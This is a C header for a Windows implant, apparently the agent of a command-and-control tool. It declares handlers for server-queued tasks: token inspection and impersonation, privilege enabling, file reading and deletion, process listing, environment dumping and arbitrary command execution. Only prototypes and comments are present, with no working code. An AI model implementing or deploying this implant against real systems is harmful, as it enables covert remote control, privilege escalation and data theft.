#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN //claude 
#endif
#include <windows.h>
#include <winsock2.h>
#include "debug.h"
#include "error.h"
#include "generated_commands.h"
#include "security.h"
#include "exports.h"

typedef DWORD (*CommandFunction)(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

typedef struct _COMMAND_MAP
{
	CMD_ID id;
	CommandFunction handler;
} COMMAND_MAP;

extern CONST COMMAND_MAP G_CommandTable[];

/**
 * @brief Handles the killimplant command.
 *
 * Marks the implant for termination so the polling loop exits cleanly after
 * the current task completes.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdKillImplant(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns a summary of the current process token.
 *
 * The current implementation returns a TOKEN_SUMMARY payload containing the
 * user name, user SID, elevation state, and whether the current thread is
 * impersonating.
 *
 * @param dataLen The command argument length in bytes. Unused by this handler.
 * @param data The command argument buffer. Unused by this handler.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdCurrentToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns a summary of a target process token.
 *
 * The intended response should mirror CmdCurrentToken so the Python client can
 * parse local and remote token summaries consistently.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdProcessToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the privileges present on a target process token.
 *
 * The response format should enumerate each privilege and its enabled state in
 * a binary payload understood by the Python display handler.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdTokenPrivileges(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to impersonate the token of a target process.
 *
 * This command reports a numeric success or failure code and the
 * user name of the owner of the impersonated token.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the target PID.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdImpersonateToken(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Attempts to enable a named privilege on the current process token.
 *
 * The request payload is expected to contain a UTF-8 privilege name string.
 * This command reports a numeric success or failure code and whether the
 * privilege was previously enabled.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing the privilege name.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdEnablePrivilege(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Executes a command synchronously by command ID.
 *
 * This function is called by the polling loop after a queued task has been
 * retrieved from the server.
 *
 * @param cmdId The numeric command identifier from the task.
 * @param dataLen The command argument payload length in bytes.
 * @param data The command argument buffer.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD ExecuteCommandById(
	DWORD cmdId,
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists the contents of a directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdLs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the contents of a file at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdCat(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Creates a directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdMkdir(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Deletes a file or directory at the given path.
 *
 * @param dataLen The command argument length in bytes.
 * @param data The command argument buffer containing a UTF-8 path.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdRm(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Lists all running processes with their PID and image name.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdPs(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the NetBIOS hostname of the local machine.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdHostname(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Returns the process ID of the implant.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdGetPid(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief Displays the current security context of the implant.
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdWhoami(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief execute a program or command and return output, exit status, or error information
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdExec(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);

/**
 * @brief  list all environment variables for the current process
 *
 * @param dataLen The command argument length in bytes. Unused.
 * @param data The command argument buffer. Unused.
 * @param responseData Receives an optional heap-allocated response buffer.
 * @param responseLen Receives the response buffer length in bytes.
 *
 * @return A numeric error or success code.
 */
DWORD CmdEnv(
	DWORD dataLen,
	CONST PBYTE data,
	PBYTE* responseData,
	DWORD* responseLen
);